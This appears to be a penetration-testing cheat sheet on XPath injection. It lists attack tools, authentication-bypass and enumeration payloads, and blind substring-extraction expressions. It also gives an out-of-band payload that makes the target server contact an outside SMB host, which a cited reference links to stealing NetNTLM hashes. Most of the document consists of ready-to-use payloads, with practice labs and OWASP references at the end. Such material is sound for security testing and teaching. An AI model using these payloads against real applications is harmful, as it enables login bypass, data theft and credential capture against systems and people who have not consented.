# xpath injection

> xpath injection is an attack technique used to exploit applications that construct xpath (xml path language) queries from user-supplied input to query or navigate xml documents.


## summary

* [tools](#tools)
* [methodology](#methodology)
    * [blind exploitation](#blind-exploitation)
    * [out of band exploitation](#out-of-band-exploitation)
* [labs](#labs)
* [references](#references)

## tools

- [orf/xcat](https://github.com/orf/xcat) - automate xpath injection attacks to retrieve documents
- [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - advanced xpath injection tool 
- [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - a fork of xxxpwn using predictive text 
- [micsoftvn/xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
- [harshal35/xmlchor](https://github.com/harshal35/xmlchor) - xpath injection exploitation tool


## methodology

similar to sql injection, you want to terminate the query properly: 

```ps1
string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
```

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

### blind exploitation

1. size of a string
    ```sql
    and string-length(account)=size_int
    ```

2. access a character with `substring`, and verify its value the `codepoints-to-string` function
    ```sql
    substring(//user[userid=5]/username,2,1)=char_here
    substring(//user[userid=5]/username,2,1)=codepoints-to-string(int_ord_char_here)
    ```

### out of band exploitation

```powershell
http://example.com/?title=foundation&type=*&rent_days=* and doc('//10.10.10.10/share')
```


## labs

* [root me - xpath injection - authentication](https://www.root-me.org/en/challenges/web-server/xpath-injection-authentication)
* [root me - xpath injection - string](https://www.root-me.org/en/challenges/web-server/xpath-injection-string)
* [root me - xpath injection - blind](https://www.root-me.org/en/challenges/web-server/xpath-injection-blind)


## references

- [places of interest in stealing netntlm hashes - osanda malith jayathissa - march 24, 2017](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
- [xpath injection - owasp - january 21, 2015](https://www.owasp.org/index.php/testing_for_xpath_injection_(otg-inpval-010))